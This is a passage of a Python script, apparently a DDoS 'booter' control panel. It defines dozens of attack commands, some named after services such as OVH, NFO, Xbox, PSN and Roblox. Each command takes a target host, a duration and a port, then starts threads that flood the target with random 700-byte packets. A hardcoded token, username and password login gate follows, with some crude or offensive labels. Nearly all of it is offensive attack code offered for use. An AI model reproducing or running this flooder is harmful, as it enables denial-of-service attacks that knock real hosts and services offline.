				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".suplex":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".kiss":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-urunal":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-satan":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-gator":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-fila":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-punt":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-crush":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-nuke":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-fuze":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-crash":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-nail":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()	
		elif sinput == ".ovh-raw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-jaws":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovh-melt":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".nfo-udp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".nfo-tcp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".nfo-amp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".nfo-xap":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".xmas-tfo":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".sack":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ssdp-x":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".psn-rape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".roblox-tech":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".discord-fly":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".xbox-fly":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()

		elif sinput == ".nfo-mock":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".redsyn":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".bluesyn":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".gatorade":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".spingebinge":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".killall3":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".bermuda":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".raw-null":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".nfo-thor":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".rainbowsyn":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".bluesyn":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".greensyn":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".hydra-slump":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".hydra-vader":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".complexity":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".okybo-x":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".hydra-tornado":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".hydra-x":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".hydra-qotd":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".hex":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".hydra-drain":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".hydra-snake":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".hydra-x":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".hydra-royal":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".eska-special":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".telnet":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".100up-path":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".path-kill":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".path-kill-all":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 700
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print(attak)
			except ValueError:
				main()
			except socket.gaierror:
				main()
			
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()
try:
	users = ["1337", "420", "me"]
	clear = "clear"
	os.system (clear)
	print (token)
	username = getpass.getpass ("[+] Token: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, exiting")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	users = ["hg", "guests", "me"]
	clear = "clear"
	os.system (clear)
	print (user)
	username = getpass.getpass ("[+] Username: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, exiting")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["hg", "gayman", "me"]
	print (passw)
	password = getpass.getpass ("[+] Password: ")
	if user == "hg":
		if password == passwords[0]:
			print ("[+] Login correct")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mSIN\033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
	if user == "guests":
		if password == passwords[1]:
			print ("[+] Login correct")
			print ("[+] Certain methods will not be available to you")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mSIN\033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
except KeyboardInterrupt:
	exit()			
try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()
